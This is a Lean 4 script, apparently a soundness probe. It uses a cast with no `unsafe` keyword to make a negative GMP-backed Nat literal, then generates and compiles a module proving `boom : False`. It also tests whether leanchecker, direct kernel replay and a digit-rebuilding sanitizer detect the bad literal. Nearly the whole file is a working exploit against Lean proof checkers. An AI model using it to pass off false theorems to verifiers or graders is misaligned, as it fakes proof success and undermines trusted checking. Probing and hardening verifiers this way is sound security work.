import Lean

open Lean

-- 100%-safe `BaseIO` cast from `leanprover/lean4#15717` (no `unsafe`, no `partial`, no `import all`)
def safeCoerce [Nonempty β] (a : α) : BaseIO β := do
  let r ← IO.mkRef a
  let r : IO.Ref β := ⟨r.ref, inferInstance⟩
  r.get

-- Also `unsafeCast` version for direct comparison
unsafe def unsafeNegNat (i : Int) : Nat := unsafeCast i

@[implemented_by unsafeNegNat]
def negNatViaUnsafeCast (i : Int) : Nat := 0

def main : IO Unit := do
  IO.println "=== Probe(b) Probe: Negative GMP `mpz` `Nat` Literal (`SafeVerify#20` / `comparator` `olean_issue`) in Lean v4.34.1 ==="

  -- Compare small scalar Int (-2 : Int) vs heap GMP Int (-4294967296 : Int, i.e., -2^32)
  let smallNeg : Int := -2
  let bigNeg   : Int := -4294967296

  let smallViaSafe : Nat ← safeCoerce smallNeg
  let bigViaSafe   : Nat ← safeCoerce bigNeg
  let bigViaUnsafe : Nat := negNatViaUnsafeCast bigNeg

  IO.println s!"[1] Small scalar `(-2 : Int)` cast to `Nat`:"
  IO.println s!"    toString smallViaSafe          = {toString smallViaSafe}"
  IO.println s!"    Nat.toDigits 10 smallViaSafe   = {String.ofList (Nat.toDigits 10 smallViaSafe)}"
  IO.println s!"    smallViaSafe == 0              = {smallViaSafe == 0}"

  IO.println s!"[2] Heap GMP `(-4294967296 : Int)` (-2^32) cast to `Nat` via 100%-safe `#15717` `safeCoerce`:"
  IO.println s!"    toString bigViaSafe (reprFast) = {toString bigViaSafe}"
  IO.println s!"    (toString bigViaSafe).startsWith \"-\" = {(toString bigViaSafe).startsWith "-"}"
  IO.println s!"    Nat.toDigits 10 bigViaSafe     = {repr (Nat.toDigits 10 bigViaSafe)}"
  IO.println s!"    bigViaSafe < USize.size        = {decide (bigViaSafe < USize.size)}"
  IO.println s!"    bigViaSafe < 128               = {decide (bigViaSafe < 128)}"
  IO.println s!"    0 <= bigViaSafe (VM)           = {Nat.ble 0 bigViaSafe}"
  IO.println s!"    bigViaSafe <= 0 (VM)           = {Nat.ble bigViaSafe 0}"
  IO.println s!"    Int.ofNat bigViaSafe           = {Int.ofNat bigViaSafe}"

  IO.println s!"[3] Heap GMP `(-4294967296 : Int)` cast via `unsafeCast`:"
  IO.println s!"    Int.ofNat bigViaUnsafe         = {Int.ofNat bigViaUnsafe}"

  -- Now construct a theorem `boom : False` in a module using `safeCoerce (-4294967296 : Int)` (ZERO `unsafe` keywords!)
  -- Follow `comparator/tests/projects/olean_issue/Solution.lean`, replacing `unsafe def badNatVal` with `#15717` `safeCoerce`!
  let exploitModSrc :=
"import Lean

open Lean

def safeCoerce [Nonempty β] (a : α) : BaseIO β := do
  let r ← IO.mkRef a
  let r : IO.Ref β := ⟨r.ref, inferInstance⟩
  r.get

run_elab do
  let badNatVal : Nat ← safeCoerce (-4294967296 : Int)
  addDecl <| .defnDecl {
    name        := `badNat
    levelParams := []
    type        := .const ``Nat []
    value       := .lit <| .natVal badNatVal
    hints       := .opaque
    safety      := .safe
  }

-- 9223372036854775807 = 2^63 - 1 (LEAN_MAX_SMALL_NAT, a boxed scalar):
-- `badNat ≤ 2^63 - 1` calls `lean_nat_big_le(LeanMPZ, scalar)` -> `false`!
theorem not_le : ¬(badNat ≤ 9223372036854775807) := by decide

-- `2^63 - 1 < badNat` is `2^63 ≤ badNat`, where `2^63 = 9223372036854775808` is a `LeanMPZ`:
-- `2^63 ≤ badNat` calls `lean_nat_big_le(LeanMPZ(2^63), LeanMPZ(-2^32))` -> `mpz_cmp` -> `false`!
theorem not_lt : ¬(9223372036854775807 < badNat) := by decide

theorem boom : False := by
  have h1 := not_le
  have h2 := not_lt
  omega
"
  IO.FS.writeFile "ExploitNegNat.lean" exploitModSrc
  let compileOut ← IO.Process.output {
    cmd := "lean"
    args := #["-o", "ExploitNegNat.olean", "ExploitNegNat.lean"]
  }
  IO.println s!"[4] Compiling `ExploitNegNat.lean` (proving `boom : False` via `safeCoerce` + `mkNatLit`, NO `unsafe`!): exitCode={compileOut.exitCode}"
  if compileOut.exitCode != 0 then
    IO.println s!"    stdout: {compileOut.stdout}"
    IO.println s!"    stderr: {compileOut.stderr}"

  -- Test `leanchecker` on `ExploitNegNat`!
  let lcOut ← IO.Process.output {
    cmd := "leanchecker"
    args := #["ExploitNegNat"]
  }
  IO.println s!"[5] Running `leanchecker ExploitNegNat`: exitCode={lcOut.exitCode}"
  if lcOut.exitCode != 0 then
    IO.println s!"    stderr: {lcOut.stderr}"

  -- Also test `Kernel.Environment.replay` directly in Lean v4.34.1!
  let env ← importModules #[{ module := `ExploitNegNat }] {} (trustLevel := 0) (loadExts := false)
  let baseEnv ← importModules #[{ module := `Lean }] {} (trustLevel := 0) (loadExts := false)
  let mut newConsts : Std.HashMap Name ConstantInfo := {}
  if let some modIdx := env.getModuleIdx? `ExploitNegNat then
    let data := env.header.moduleData[modIdx]!
    for ci in data.constants do
      newConsts := newConsts.insert ci.name ci
  let replayedKernelEnv ← baseEnv.toKernelEnv.replay newConsts
  let hasBoom := replayedKernelEnv.find? `boom |>.isSome
  IO.println s!"[6] Direct `baseEnv.toKernelEnv.replay` of `ExploitNegNat.olean`: succeeded! `boom : False` present={hasBoom}"

  -- Now test what Anneal's `TrustedBoundary.lean` `rebuildExpr` (`Nat.ofDigits 10 (Nat.toDigits 10 n)`) does on `badNat`!
  if let some (.defnInfo dv) := env.find? `badNat then
    match dv.value with
    | .lit (.natVal n) =>
      let digits := Nat.toDigits 10 n
      -- TrustedBoundary.lean's Nat.ofDigits:
      let cleanN := digits.foldl (fun acc c => acc * 10 + (c.toNat - '0'.toNat)) 0
      IO.println s!"[7] Anneal `TrustedBoundary.lean` `rebuildExpr` on `badNat`:"
      IO.println s!"    Original `Int.ofNat n`       = {Int.ofNat n}"
      IO.println s!"    `Nat.toDigits 10 n`          = {repr digits}"
      IO.println s!"    Rebuilt `cleanN` (non-neg!)  = {cleanN} (Int.ofNat = {Int.ofNat cleanN})"
      -- Now rebuild all constants in ExploitNegNat using `cleanN` and try `baseEnv.toKernelEnv.replay`!
      let mut sanitizedConsts : Std.HashMap Name ConstantInfo := {}
      for (k, ci) in newConsts do
        let ci' := match ci with
          | .defnInfo v =>
            if k == `badNat then .defnInfo { v with value := .lit (.natVal cleanN) } else ci
          | _ => ci
        sanitizedConsts := sanitizedConsts.insert k ci'
      try
        let _ ← baseEnv.toKernelEnv.replay sanitizedConsts
        IO.println s!"    Replay AFTER `TrustedBoundary.lean` `rebuildExpr`: UNEXPECTEDLY SUCCEEDED"
      catch e =>
        IO.println s!"    Replay AFTER `TrustedBoundary.lean` `rebuildExpr`: REJECTED BY KERNEL! ({e})"
    | _ => IO.println "    Unexpected badNat value"
